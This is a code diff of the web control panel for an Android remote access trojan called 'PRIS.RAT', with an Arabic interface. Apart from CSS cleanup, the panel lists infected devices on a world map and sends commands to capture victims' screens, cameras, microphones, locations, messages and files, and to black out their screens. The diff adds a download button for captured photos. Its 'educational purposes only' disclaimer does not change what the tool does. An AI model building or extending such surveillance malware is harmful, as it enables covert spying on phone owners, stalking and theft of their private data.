@@ -25,21 +25,11 @@
   --text-dim: #7a7e8a;
 }
 
-[data-theme="light"] {
-  --bg: #f0f2f5;
-  --panel: #ffffff;
-  --panel-2: #f8f9fb;
-  --border: #e1e4e8;
-  --text: #1a1a1a;
-  --text-dim: #6a6e7a;
-}
-
 body {
   background: var(--bg);
   color: var(--text);
   min-height: 100vh;
   font-size: 14px;
-  transition: background 0.3s, color 0.3s;
 }
 
 .layout {
@@ -48,7 +38,7 @@ body {
   min-height: 100vh;
 }
 
-/* ==================== SIDEBAR ==================== */
+/* SIDEBAR */
 .sidebar {
   background: var(--panel);
   border-left: 1px solid var(--border);
@@ -81,22 +71,11 @@ body {
   box-shadow: 0 0 15px rgba(255,0,51,0.5);
 }
 
-.sidebar-logo-text h2 {
-  font-size: 17px;
-  letter-spacing: 1px;
-  color: var(--text);
-}
+.sidebar-logo-text h2 { font-size: 17px; letter-spacing: 1px; }
 .sidebar-logo-text h2 span { color: var(--red); }
-.sidebar-logo-text p {
-  font-size: 8px;
-  color: var(--text-dim);
-  letter-spacing: 2px;
-}
+.sidebar-logo-text p { font-size: 8px; color: var(--text-dim); letter-spacing: 2px; }
 
-.sidebar-nav {
-  flex: 1;
-  padding: 12px 8px;
-}
+.sidebar-nav { flex: 1; padding: 12px 8px; }
 
 .nav-item {
   display: flex;
@@ -113,27 +92,10 @@ body {
   border-right: 3px solid transparent;
 }
 
-.nav-item:hover {
-  background: rgba(255,0,51,0.05);
-  color: var(--text);
-}
-
-.nav-item.active {
-  background: var(--red-dim);
-  color: var(--text);
-  border-right-color: var(--red);
-}
-
+.nav-item:hover { background: rgba(255,0,51,0.05); color: var(--text); }
+.nav-item.active { background: var(--red-dim); color: var(--text); border-right-color: var(--red); }
 .nav-item .ico { font-size: 18px; width: 22px; text-align: center; }
-.nav-item .badge {
-  margin-right: auto;
-  background: var(--red);
-  color: #fff;
-  padding: 2px 8px;
-  border-radius: 10px;
-  font-size: 10px;
-  font-weight: bold;
-}
+.nav-item .badge { margin-right: auto; background: var(--red); color: #fff; padding: 2px 8px; border-radius: 10px; font-size: 10px; font-weight: bold; }
 
 .sidebar-footer {
   padding: 15px;
@@ -143,13 +105,9 @@ body {
   text-align: center;
 }
 
-/* ==================== MAIN ==================== */
-.main {
-  padding: 15px 20px;
-  overflow-x: hidden;
-}
+/* MAIN */
+.main { padding: 15px 20px; }
 
-/* ==================== TOP HEADER ==================== */
 .top-header {
   display: flex;
   align-items: center;
@@ -162,11 +120,7 @@ body {
   flex-wrap: wrap;
 }
 
-.top-logo {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-}
+.top-logo { display: flex; align-items: center; gap: 10px; }
 
 .top-logo-icon {
   width: 40px;
@@ -180,16 +134,9 @@ body {
   font-size: 20px;
 }
 
-.top-logo-text h1 {
-  font-size: 20px;
-  letter-spacing: 1.5px;
-}
+.top-logo-text h1 { font-size: 20px; letter-spacing: 1.5px; }
 .top-logo-text h1 span { color: var(--red); }
-.top-logo-text p {
-  font-size: 8px;
-  color: var(--text-dim);
-  letter-spacing: 2px;
-}
+.top-logo-text p { font-size: 8px; color: var(--text-dim); letter-spacing: 2px; }
 
 .top-info {
   display: flex;
@@ -210,10 +157,7 @@ body {
   font-size: 12px;
 }
 
-.info-pill.online {
-  border-color: var(--green);
-  color: var(--green);
-}
+.info-pill.online { border-color: var(--green); color: var(--green); }
 
 .dot {
   width: 8px;
@@ -224,12 +168,7 @@ body {
   animation: pulse 2s infinite;
 }
 
-@keyframes pulse {
-  0%,100% { opacity: 1; }
-  50% { opacity: 0.4; }
-}
-
-.info-pill .icon { font-size: 14px; }
+@keyframes pulse { 0%,100% { opacity: 1; } 50% { opacity: 0.4; } }
 
 .user-pill {
   display: flex;
@@ -254,7 +193,7 @@ body {
   text-decoration: none;
 }
 
-/* ==================== STATS GRID ==================== */
+/* STATS */
 .stats-grid {
   display: grid;
   grid-template-columns: repeat(4, 1fr);
@@ -305,25 +244,10 @@ body {
 .stat-card.yellow .stat-icon { background: rgba(255,170,0,0.15); }
 
 .stat-info { flex: 1; min-width: 0; }
-.stat-info .label {
-  font-size: 11px;
-  color: var(--text-dim);
-  margin-bottom: 4px;
-}
-.stat-info .num {
-  font-size: 24px;
-  font-weight: bold;
-  color: var(--text);
-  line-height: 1;
-}
-.stat-info .trend {
-  font-size: 10px;
-  margin-top: 4px;
-}
-.trend.up { color: var(--green); }
-.trend.down { color: #ff3333; }
+.stat-info .label { font-size: 11px; color: var(--text-dim); margin-bottom: 4px; }
+.stat-info .num { font-size: 24px; font-weight: bold; color: var(--text); line-height: 1; }
 
-/* ==================== MAIN GRID ==================== */
+/* MAIN GRID */
 .main-grid {
   display: grid;
   grid-template-columns: 1.5fr 1fr 0.8fr;
@@ -346,30 +270,13 @@ body {
   border-bottom: 1px solid var(--border);
 }
 
-.panel-title {
-  display: flex;
-  align-items: center;
-  gap: 8px;
-  font-size: 13px;
-  font-weight: bold;
-}
-
+.panel-title { display: flex; align-items: center; gap: 8px; font-size: 13px; font-weight: bold; }
 .panel-title .icon { font-size: 16px; }
-
-.panel-action {
-  font-size: 11px;
-  color: var(--red);
-  cursor: pointer;
-  text-decoration: none;
-}
-
+.panel-action { font-size: 11px; color: var(--red); cursor: pointer; text-decoration: none; }
 .panel-body { padding: 12px 15px; }
 
-/* ==================== DEVICES TABLE ==================== */
-.devices-table {
-  width: 100%;
-  font-size: 12px;
-}
+/* DEVICES TABLE */
+.devices-table { width: 100%; font-size: 12px; }
 
 .devices-table thead th {
   text-align: right;
@@ -381,26 +288,11 @@ body {
   text-transform: uppercase;
 }
 
-.devices-table tbody tr {
-  border-bottom: 1px solid var(--border);
-  cursor: pointer;
-  transition: background 0.2s;
-}
-
-.devices-table tbody tr:hover {
-  background: rgba(255,0,51,0.05);
-}
-
-.devices-table tbody tr.selected {
-  background: rgba(0,255,136,0.08);
-}
-
+.devices-table tbody tr { border-bottom: 1px solid var(--border); cursor: pointer; transition: background 0.2s; }
+.devices-table tbody tr:hover { background: rgba(255,0,51,0.05); }
+.devices-table tbody tr.selected { background: rgba(0,255,136,0.08); }
 .devices-table tbody tr:last-child { border-bottom: none; }
-
-.devices-table td {
-  padding: 10px 6px;
-  vertical-align: middle;
-}
+.devices-table td { padding: 10px 6px; vertical-align: middle; }
 
 .dev-icon {
   width: 32px;
@@ -413,177 +305,61 @@ body {
   font-size: 16px;
 }
 
-.dev-info .name {
-  font-weight: bold;
-  color: var(--text);
-  font-size: 12px;
-}
-.dev-info .sub {
-  font-size: 10px;
-  color: var(--text-dim);
-  margin-top: 2px;
-}
+.dev-info .name { font-weight: bold; color: var(--text); font-size: 12px; }
+.dev-info .sub { font-size: 10px; color: var(--text-dim); margin-top: 2px; }
 
-.status-tag {
-  padding: 3px 10px;
-  border-radius: 10px;
-  font-size: 10px;
-  font-weight: bold;
-}
-.status-tag.online {
-  background: var(--green-dim);
-  color: var(--green);
-  border: 1px solid var(--green);
-}
-.status-tag.offline {
-  background: rgba(255,51,51,0.15);
-  color: #ff3333;
-  border: 1px solid #ff3333;
-}
+.status-tag { padding: 3px 10px; border-radius: 10px; font-size: 10px; font-weight: bold; }
+.status-tag.online { background: var(--green-dim); color: var(--green); border: 1px solid var(--green); }
+.status-tag.offline { background: rgba(255,51,51,0.15); color: #ff3333; border: 1px solid #ff3333; }
 
-.chevron {
+.loc-ip { font-size: 10px; color: var(--text-dim); font-family: monospace; }
+
+.remove-btn {
+  background: transparent;
+  border: none;
   color: var(--text-dim);
-  font-size: 16px;
   cursor: pointer;
+  font-size: 14px;
+  padding: 4px 6px;
+  border-radius: 6px;
+  transition: all 0.2s;
 }
 
-/* ==================== WORLD MAP ==================== */
-#worldMap {
-  width: 100%;
-  height: 220px;
-  border-radius: 8px;
-  background: #0a0f18;
-}
+.remove-btn:hover { background: rgba(255,51,51,0.2); color: #ff3333; }
 
-.location-list {
-  margin-top: 10px;
-  max-height: 180px;
-  overflow-y: auto;
-}
+/* WORLD MAP */
+#worldMap { width: 100%; height: 220px; border-radius: 8px; background: #0a0f18; }
 
-.loc-item {
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  padding: 8px 0;
-  border-bottom: 1px solid var(--border);
-  font-size: 11px;
-}
+.location-list { margin-top: 10px; max-height: 180px; overflow-y: auto; }
 
+.loc-item { display: flex; align-items: center; gap: 10px; padding: 8px 0; border-bottom: 1px solid var(--border); font-size: 11px; }
 .loc-item:last-child { border-bottom: none; }
-
-.loc-flag {
-  width: 22px;
-  height: 15px;
-  border-radius: 2px;
-  flex-shrink: 0;
-}
-
 .loc-info { flex: 1; min-width: 0; }
-.loc-info .city {
-  color: var(--text);
-  font-weight: bold;
-  font-size: 11px;
-}
-.loc-info .model {
-  color: var(--text-dim);
-  font-size: 10px;
-  margin-top: 2px;
-}
+.loc-info .city { color: var(--text); font-weight: bold; font-size: 11px; }
+.loc-info .model { color: var(--text-dim); font-size: 10px; margin-top: 2px; }
 
-.loc-ip {
-  font-size: 10px;
-  color: var(--text-dim);
-  font-family: monospace;
-}
-
-/* ==================== SYSTEM STATUS ==================== */
-.sys-item {
-  margin-bottom: 12px;
-}
+/* SYSTEM */
+.sys-item { margin-bottom: 12px; }
 .sys-item:last-child { margin-bottom: 0; }
+.sys-label { display: flex; justify-content: space-between; align-items: center; font-size: 11px; margin-bottom: 6px; }
+.sys-label .name { color: var(--text); display: flex; align-items: center; gap: 6px; }
+.sys-label .val { color: var(--text-dim); font-weight: bold; }
 
-.sys-label {
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  font-size: 11px;
-  margin-bottom: 6px;
-}
-
-.sys-label .name {
-  color: var(--text);
-  display: flex;
-  align-items: center;
-  gap: 6px;
-}
-.sys-label .icon { font-size: 13px; }
-.sys-label .val {
-  color: var(--text-dim);
-  font-weight: bold;
-}
-
-.progress {
-  height: 6px;
-  background: var(--panel-2);
-  border-radius: 3px;
-  overflow: hidden;
-}
-
-.progress-bar {
-  height: 100%;
-  border-radius: 3px;
-  background: var(--red);
-  transition: width 0.5s;
-}
-
+.progress { height: 6px; background: var(--panel-2); border-radius: 3px; overflow: hidden; }
+.progress-bar { height: 100%; border-radius: 3px; background: var(--red); transition: width 0.5s; }
 .progress-bar.green { background: var(--green); }
 .progress-bar.blue { background: var(--blue); }
 .progress-bar.yellow { background: var(--yellow); }
 
-/* ==================== QUICK ACTIONS ==================== */
-.quick-actions {
-  display: grid;
-  grid-template-columns: 1fr 1fr;
-  gap: 8px;
-}
-
-.qa-btn {
-  background: var(--panel-2);
-  border: 1px solid var(--border);
-  border-radius: 10px;
-  padding: 15px 10px;
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 8px;
-  cursor: pointer;
-  transition: all 0.2s;
-  color: var(--text);
-  font-size: 11px;
-  font-family: inherit;
-}
-
-.qa-btn:hover {
-  border-color: var(--red);
-  background: var(--red-dim);
-  transform: translateY(-2px);
-}
-
-.qa-btn .ico { font-size: 22px; }
-
-/* ==================== BOTTOM GRID ==================== */
+/* BOTTOM GRID */
 .bottom-grid {
   display: grid;
   grid-template-columns: 1fr 1.2fr 1fr;
   gap: 12px;
 }
 
-/* ==================== ACTIVITY ==================== */
-.activity-list {
-  max-height: 200px;
-  overflow-y: auto;
-}
+/* ACTIVITY */
+.activity-list { max-height: 200px; overflow-y: auto; }
 
 .activity-item {
   display: flex;
@@ -609,34 +385,16 @@ body {
 }
 
 .activity-info { flex: 1; min-width: 0; }
-.activity-info .text {
-  color: var(--text);
-  font-size: 11px;
-  white-space: nowrap;
-  overflow: hidden;
-  text-overflow: ellipsis;
-}
-.activity-info .device {
-  color: var(--text-dim);
-  font-size: 10px;
-  margin-top: 2px;
-}
+.activity-info .text { color: var(--text); font-size: 11px; }
+.activity-info .device { color: var(--text-dim); font-size: 10px; margin-top: 2px; }
+.activity-time { color: var(--text-dim); font-size: 10px; flex-shrink: 0; }
 
-.activity-time {
-  color: var(--text-dim);
-  font-size: 10px;
-  flex-shrink: 0;
-}
-
-/* ==================== QUICK NOTE ==================== */
+/* QUICK NOTE */
 .note-box {
   background: var(--panel-2);
   border: 1px solid var(--border);
   border-radius: 8px;
   padding: 12px;
-  font-size: 11px;
-  color: var(--text-dim);
-  line-height: 1.6;
   min-height: 100px;
 }
 
@@ -652,13 +410,45 @@ body {
   min-height: 80px;
 }
 
-/* ==================== CHART ==================== */
-#trafficChart {
-  width: 100%;
-  height: 180px;
+/* CHART */
+#trafficChart { width: 100%; height: 180px; }
+
+/* QUICK ACTIONS */
+.quick-actions { display: grid; grid-template-columns: repeat(6, 1fr); gap: 8px; }
+
+.qa-btn {
+  background: var(--panel-2);
+  border: 1px solid var(--border);
+  border-radius: 10px;
+  padding: 15px 10px;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  gap: 8px;
+  cursor: pointer;
+  transition: all 0.2s;
+  color: var(--text);
+  font-size: 11px;
+  font-family: inherit;
 }
 
-/* ==================== TOAST ==================== */
+.qa-btn:hover { border-color: var(--red); background: var(--red-dim); transform: translateY(-2px); }
+.qa-btn .ico { font-size: 22px; }
+
+/* FOOTER */
+.main-footer {
+  text-align: center;
+  padding: 20px;
+  color: var(--text-dim);
+  font-size: 11px;
+  border-top: 1px solid var(--border);
+  margin-top: 20px;
+}
+
+.main-footer .brand { font-size: 15px; font-weight: bold; margin-bottom: 8px; letter-spacing: 3px; }
+.main-footer .brand span { color: var(--red); }
+
+/* TOAST */
 .toast {
   position: fixed;
   top: 20px;
@@ -672,6 +462,7 @@ body {
   max-width: 300px;
   animation: slideIn 0.3s;
 }
+
 .toast.success { background: rgba(0,255,136,0.15); color: var(--green); border-color: var(--green); }
 .toast.error { background: rgba(255,51,51,0.15); color: #ff3333; border-color: #ff3333; }
 .toast.info { background: rgba(255,0,51,0.15); color: var(--red); border-color: var(--red); }
@@ -681,23 +472,7 @@ body {
   to { transform: translateX(0); opacity: 1; }
 }
 
-/* ==================== REMOVE BTN ==================== */
-.remove-btn {
-  background: transparent;
-  border: none;
-  color: var(--text-dim);
-  cursor: pointer;
-  font-size: 14px;
-  padding: 4px 6px;
-  border-radius: 6px;
-  transition: all 0.2s;
-}
-.remove-btn:hover {
-  background: rgba(255,51,51,0.2);
-  color: #ff3333;
-}
-
-/* ==================== RESPONSIVE ==================== */
+/* RESPONSIVE */
 .menu-toggle {
   display: none;
   background: var(--panel-2);
@@ -714,6 +489,7 @@ body {
   .main-grid { grid-template-columns: 1fr; }
   .bottom-grid { grid-template-columns: 1fr; }
   .stats-grid { grid-template-columns: 1fr 1fr; }
+  .quick-actions { grid-template-columns: repeat(3, 1fr); }
 }
 
 @media (max-width: 800px) {
@@ -731,18 +507,14 @@ body {
   .sidebar.open { transform: translateX(0); }
   .menu-toggle { display: flex; align-items: center; justify-content: center; }
   .stats-grid { grid-template-columns: 1fr; }
-  .devices-table { font-size: 10px; }
-  .devices-table thead th { font-size: 9px; padding: 6px 3px; }
-  .devices-table td { padding: 8px 3px; }
-  .top-header { padding: 10px; }
   .main { padding: 10px; }
+  .quick-actions { grid-template-columns: repeat(2, 1fr); }
 }
 </style>
 </head>
 <body>
 
 <div class="layout">
-  <!-- SIDEBAR -->
   <aside class="sidebar" id="sidebar">
     <div class="sidebar-logo">
       <div class="sidebar-logo-icon">🐺</div>
@@ -752,35 +524,15 @@ body {
       </div>
     </div>
     <nav class="sidebar-nav">
-      <a class="nav-item active" data-i18n="dashboard">
-        <span class="ico">🏠</span><span>الرئيسية</span>
-      </a>
-      <a class="nav-item" data-i18n="devices">
-        <span class="ico">📱</span><span>الأجهزة</span>
-        <span class="badge">{{ total }}</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('screen')">
-        <span class="ico">🖥️</span><span>عرض الشاشة</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('camera')">
-        <span class="ico">📷</span><span>الكاميرا</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('mic')">
-        <span class="ico">🎤</span><span>المايكروفون</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('location')">
-        <span class="ico">📍</span><span>الموقع</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('messages')">
-        <span class="ico">💬</span><span>الرسائل</span>
-        <span class="badge">0</span>
-      </a>
-      <a class="nav-item" onclick="cmdAndToast('files')">
-        <span class="ico">📁</span><span>الملفات</span>
-      </a>
-      <a class="nav-item" onclick="window.location.href='/settings'">
-        <span class="ico">⚙️</span><span>الإعدادات</span>
-      </a>
+      <a class="nav-item active"><span class="ico">🏠</span><span>الرئيسية</span></a>
+      <a class="nav-item" onclick="scrollToDevices()"><span class="ico">📱</span><span>الأجهزة</span><span class="badge">{{ total }}</span></a>
+      <a class="nav-item" onclick="cmdAndToast('screen')"><span class="ico">🖥️</span><span>عرض الشاشة</span></a>
+      <a class="nav-item" onclick="cmdAndToast('camera')"><span class="ico">📷</span><span>الكاميرا</span></a>
+      <a class="nav-item" onclick="cmdAndToast('mic')"><span class="ico">🎤</span><span>المايكروفون</span></a>
+      <a class="nav-item" onclick="cmdAndToast('location')"><span class="ico">📍</span><span>الموقع</span></a>
+      <a class="nav-item" onclick="cmdAndToast('messages')"><span class="ico">💬</span><span>الرسائل</span></a>
+      <a class="nav-item" onclick="cmdAndToast('files')"><span class="ico">📁</span><span>الملفات</span></a>
+      <a class="nav-item" onclick="window.location.href='/settings'"><span class="ico">⚙️</span><span>الإعدادات</span></a>
     </nav>
     <div class="sidebar-footer">
       <div>Powered by</div>
@@ -788,10 +540,7 @@ body {
     </div>
   </aside>
 
-  <!-- MAIN -->
   <main class="main">
-
-    <!-- TOP HEADER -->
     <div class="top-header">
       <button class="menu-toggle" onclick="toggleMenu()">☰</button>
       <div class="top-logo">
@@ -807,7 +556,7 @@ body {
           <span>Server Online</span>
         </div>
         <div class="info-pill">
-          <span class="icon">🕐</span>
+          <span>🕐</span>
           <div>
             <div id="clockDate" style="font-size: 9px; color: var(--text-dim);">--/--/----</div>
             <div id="clockTime" style="font-size: 12px; font-weight: bold;">--:--:--</div>
@@ -824,14 +573,12 @@ body {
       <a href="/logout" class="logout-btn">Logout</a>
     </div>
 
-    <!-- STATS -->
     <div class="stats-grid">
       <div class="stat-card">
         <div class="stat-icon">📱</div>
         <div class="stat-info">
           <div class="label">Total Devices</div>
           <div class="num">{{ total }}</div>
-          <div class="trend up">↑ إجمالي الأجهزة</div>
         </div>
       </div>
       <div class="stat-card green">
@@ -839,7 +586,6 @@ body {
         <div class="stat-info">
           <div class="label">Online</div>
           <div class="num">{{ online }}</div>
-          <div class="trend up" id="onlineTrend">↑ {{ online }}</div>
         </div>
       </div>
       <div class="stat-card red">
@@ -847,29 +593,21 @@ body {
         <div class="stat-info">
           <div class="label">Offline</div>
           <div class="num">{{ offline }}</div>
-          <div class="trend down" id="offlineTrend">↓ {{ offline }}</div>
         </div>
       </div>
       <div class="stat-card yellow">
         <div class="stat-icon">⚠️</div>
         <div class="stat-info">
           <div class="label">Alerts</div>
-          <div class="num" id="alertsNum">0</div>
-          <div class="trend up">يحتاج انتباه</div>
+          <div class="num">0</div>
         </div>
       </div>
     </div>
 
-    <!-- MAIN GRID -->
     <div class="main-grid">
-
-      <!-- Connected Devices -->
-      <div class="panel">
+      <div class="panel" id="devicesPanel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">💻</span>
-            <span>Connected Devices</span>
-          </div>
+          <div class="panel-title"><span class="icon">💻</span><span>Connected Devices</span></div>
           <a class="panel-action">View All →</a>
         </div>
         <div class="panel-body" style="padding: 0 15px;">
@@ -899,8 +637,7 @@ body {
                 </td>
                 <td>
                   <div style="display: flex; align-items: center; gap: 6px; font-size: 11px;">
-                    <span>🤖</span>
-                    <span>Android {{ d.android }}</span>
+                    <span>🤖</span><span>Android {{ d.android }}</span>
                   </div>
                 </td>
                 <td>
@@ -925,13 +662,9 @@ body {
         </div>
       </div>
 
-      <!-- World Map -->
       <div class="panel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">🌍</span>
-            <span>World Map</span>
-          </div>
+          <div class="panel-title"><span class="icon">🌍</span><span>World Map</span></div>
           <a class="panel-action">View All →</a>
         </div>
         <div class="panel-body">
@@ -944,114 +677,71 @@ body {
         </div>
       </div>
 
-      <!-- System Status -->
       <div class="panel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">💓</span>
-            <span>System Status</span>
-          </div>
+          <div class="panel-title"><span class="icon">💓</span><span>System Status</span></div>
         </div>
         <div class="panel-body">
           <div class="sys-item">
-            <div class="sys-label">
-              <div class="name"><span class="icon">🖥️</span> CPU Usage</div>
-              <div class="val" id="cpuVal">0%</div>
-            </div>
+            <div class="sys-label"><div class="name"><span>🖥️</span> CPU Usage</div><div class="val" id="cpuVal">0%</div></div>
             <div class="progress"><div class="progress-bar" id="cpuBar" style="width: 0%;"></div></div>
           </div>
           <div class="sys-item">
-            <div class="sys-label">
-              <div class="name"><span class="icon">🧠</span> RAM Usage</div>
-              <div class="val" id="ramVal">0%</div>
-            </div>
+            <div class="sys-label"><div class="name"><span>🧠</span> RAM Usage</div><div class="val" id="ramVal">0%</div></div>
             <div class="progress"><div class="progress-bar blue" id="ramBar" style="width: 0%;"></div></div>
           </div>
           <div class="sys-item">
-            <div class="sys-label">
-              <div class="name"><span class="icon">💾</span> Disk Usage</div>
-              <div class="val" id="diskVal">0%</div>
-            </div>
+            <div class="sys-label"><div class="name"><span>💾</span> Disk Usage</div><div class="val" id="diskVal">0%</div></div>
             <div class="progress"><div class="progress-bar yellow" id="diskBar" style="width: 0%;"></div></div>
           </div>
           <div class="sys-item">
-            <div class="sys-label">
-              <div class="name"><span class="icon">📡</span> Network</div>
-              <div class="val" id="netVal">0 KB/s</div>
-            </div>
+            <div class="sys-label"><div class="name"><span>📡</span> Network</div><div class="val" id="netVal">0 MB</div></div>
           </div>
         </div>
       </div>
-
     </div>
 
-    <!-- BOTTOM GRID -->
     <div class="bottom-grid">
-
-      <!-- Activity -->
       <div class="panel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">🕐</span>
-            <span>Recent Activity</span>
-          </div>
+          <div class="panel-title"><span class="icon">🕐</span><span>Recent Activity</span></div>
           <a class="panel-action">View All →</a>
         </div>
         <div class="panel-body" style="padding: 0 15px;">
           <div class="activity-list" id="activityList">
-            <div style="text-align: center; color: var(--text-dim); font-size: 11px; padding: 15px;">
-              جاري التحميل...
-            </div>
+            <div style="text-align: center; color: var(--text-dim); font-size: 11px; padding: 15px;">جاري التحميل...</div>
           </div>
         </div>
       </div>
 
-      <!-- Network Traffic -->
       <div class="panel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">📊</span>
-            <span>Network Traffic</span>
-          </div>
+          <div class="panel-title"><span class="icon">📊</span><span>Network Traffic</span></div>
         </div>
         <div class="panel-body">
           <canvas id="trafficChart"></canvas>
         </div>
       </div>
 
-      <!-- Quick Note + Quick Actions -->
       <div class="panel">
         <div class="panel-header">
-          <div class="panel-title">
-            <span class="icon">📝</span>
-            <span>Quick Note</span>
-          </div>
+          <div class="panel-title"><span class="icon">📝</span><span>Quick Note</span></div>
         </div>
         <div class="panel-body">
           <div class="note-box">
             <textarea id="quickNote" placeholder="اكتب ملاحظاتك هنا...">Stay secure. Use only for educational purposes.</textarea>
           </div>
-          <div style="margin-top: 12px;">
-            <div style="font-size: 10px; color: var(--text-dim); text-align: center; letter-spacing: 1px;">
-              More Control · More Possibilities
-            </div>
-          </div>
         </div>
       </div>
-
     </div>
 
-    <!-- Quick Actions Row -->
     <div class="panel" style="margin-top: 12px;">
       <div class="panel-header">
-        <div class="panel-title">
-          <span class="icon">⚡</span>
-          <span>Quick Actions</span>
-        </div>
+        <div class="panel-title"><span class="icon">⚡</span><span>Quick Actions</span></div>
       </div>
       <div class="panel-body">
-        <div class="quick-actions" style="grid-template-columns: repeat(6, 1fr);">
-          <button class="qa-btn" onclick="startScreen()"><span class="ico">🖥️</span>Screen View</button>
+        <div class="quick-actions">
+          <button class="qa-btn" onclick="startScreen()"><span class="ico">🖥️</span>Screen</button>
           <button class="qa-btn" onclick="cmd('camera')"><span class="ico">📷</span>Camera</button>
           <button class="qa-btn" onclick="cmd('location')"><span class="ico">📍</span>Location</button>
           <button class="qa-btn" onclick="cmd('blackout')"><span class="ico">⬛</span>Blackout</button>
@@ -1061,15 +751,11 @@ body {
       </div>
     </div>
 
-    <!-- Footer -->
-    <div style="text-align: center; margin-top: 20px; padding: 20px; color: var(--text-dim); font-size: 11px; border-top: 1px solid var(--border);">
-      <div style="font-size: 13px; font-weight: bold; margin-bottom: 8px; letter-spacing: 2px;">
-        <span style="color: var(--red);">PRIS.RAT</span> © 2026
-      </div>
+    <div class="main-footer">
+      <div class="brand"><span>PRIS.RAT</span> © 2026</div>
       <div>Developed by <strong style="color: var(--red);">mkgg449-dotcom</strong></div>
-      <div style="margin-top: 5px;">All Rights Reserved · For Educational Purposes Only</div>
+      <div style="margin-top: 5px; font-size: 10px;">All Rights Reserved · For Educational Purposes Only</div>
     </div>
-
   </main>
 </div>
 
@@ -1078,7 +764,6 @@ body {
 let selectedDevice = null;
 const socket = io();
 
-/* ============ CLOCK ============ */
 function updateClock() {
   const now = new Date();
   document.getElementById('clockTime').textContent = now.toLocaleTimeString('ar-EG');
@@ -1087,25 +772,19 @@ function updateClock() {
 setInterval(updateClock, 1000);
 updateClock();
 
-/* ============ SOCKET ============ */
 socket.on('devices_update', () => setTimeout(() => location.reload(), 800));
 
 socket.on('device_response', (data) => {
   if (data.type === 'camera' && data.image) showImage('data:image/jpeg;base64,' + data.image);
-  if (data.type === 'location') {
-    if (data.lat && data.lon && (data.lat !== 0 || data.lon !== 0)) {
-      addLocationToMap(data.lat, data.lon, data.id);
-      showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
-    }
+  if (data.type === 'location' && data.lat && data.lon && (data.lat !== 0 || data.lon !== 0)) {
+    addLocationToMap(data.lat, data.lon, data.id);
+    showToast('📍 ' + data.lat.toFixed(4) + ', ' + data.lon.toFixed(4), 'success');
   }
 });
 
-/* ============ MENU ============ */
-function toggleMenu() {
-  document.getElementById('sidebar').classList.toggle('open');
-}
+function toggleMenu() { document.getElementById('sidebar').classList.toggle('open'); }
+function scrollToDevices() { document.getElementById('devicesPanel').scrollIntoView({behavior: 'smooth'}); }
 
-/* ============ DEVICES ============ */
 function selectDevice(id, el) {
   selectedDevice = id;
   document.querySelectorAll('.devices-table tbody tr').forEach(r => r.classList.remove('selected'));
@@ -1121,7 +800,6 @@ function removeDevice(event, id) {
   if (selectedDevice === id) selectedDevice = null;
 }
 
-/* ============ COMMANDS ============ */
 function startScreen() {
   if (!selectedDevice) { showToast('⚠️ اختر جهاز أولاً', 'error'); return; }
   try { sessionStorage.setItem('selectedDevice', selectedDevice); } catch(e) {}
@@ -1140,19 +818,45 @@ function cmdAndToast(action) {
   showToast('📤 ' + action, 'info');
 }
 
-/* ============ IMAGE ============ */
 function showImage(src) {
+  const old = document.getElementById('imgViewer');
+  if (old) old.remove();
+
   const v = document.createElement('div');
-  v.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:99999;cursor:pointer;';
+  v.id = 'imgViewer';
+  v.style.cssText = 'position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.95);display:flex;align-items:center;justify-content:center;z-index:99999;flex-direction:column;padding:20px;';
+
+  const toolbar = document.createElement('div');
+  toolbar.style.cssText = 'position:absolute;top:20px;right:20px;display:flex;gap:10px;z-index:100000;';
+
+  const dlBtn = document.createElement('a');
+  dlBtn.href = src;
+  dlBtn.download = 'pris_capture_' + Date.now() + '.jpg';
+  dlBtn.textContent = '⬇️ تحميل';
+  dlBtn.style.cssText = 'background:linear-gradient(135deg,#0099ff,#0055aa);color:#fff;padding:12px 20px;border-radius:10px;text-decoration:none;font-weight:bold;font-size:13px;cursor:pointer;box-shadow:0 0 15px rgba(0,153,255,0.5);';
+  toolbar.appendChild(dlBtn);
+
+  const closeBtn = document.createElement('button');
+  closeBtn.textContent = '✖ إغلاق';
+  closeBtn.style.cssText = 'background:linear-gradient(135deg,#ff0033,#990000);color:#fff;padding:12px 20px;border-radius:10px;font-weight:bold;font-size:13px;cursor:pointer;box-shadow:0 0 15px rgba(255,0,51,0.5);border:none;font-family:inherit;';
+  closeBtn.onclick = () => v.remove();
+  toolbar.appendChild(closeBtn);
+
   const img = document.createElement('img');
   img.src = src;
-  img.style.cssText = 'max-width:95%;max-height:95%;border:3px solid #ff0033;border-radius:12px;box-shadow:0 0 40px rgba(255,0,51,0.8);';
+  img.style.cssText = 'max-width:95%;max-height:85%;border:3px solid #ff0033;border-radius:12px;box-shadow:0 0 40px rgba(255,0,51,0.8);';
+
+  const info = document.createElement('div');
+  info.style.cssText = 'color:#888;font-size:12px;margin-top:15px;';
+  info.textContent = 'صورة من الجهاز — ' + new Date().toLocaleString('ar-EG');
+
+  v.appendChild(toolbar);
   v.appendChild(img);
-  v.onclick = () => v.remove();
+  v.appendChild(info);
+  v.onclick = (e) => { if (e.target === v) v.remove(); };
   document.body.appendChild(v);
 }
 
-/* ============ TOAST ============ */
 function showToast(msg, type) {
   const t = document.createElement('div');
   t.className = 'toast ' + type;
@@ -1161,7 +865,6 @@ function showToast(msg, type) {
   setTimeout(() => t.remove(), 3000);
 }
 
-/* ============ SYSTEM STATUS ============ */
 async function updateSystem() {
   try {
     const res = await fetch('/api/system');
@@ -1178,7 +881,6 @@ async function updateSystem() {
 setInterval(updateSystem, 3000);
 updateSystem();
 
-/* ============ ACTIVITY ============ */
 async function updateActivity() {
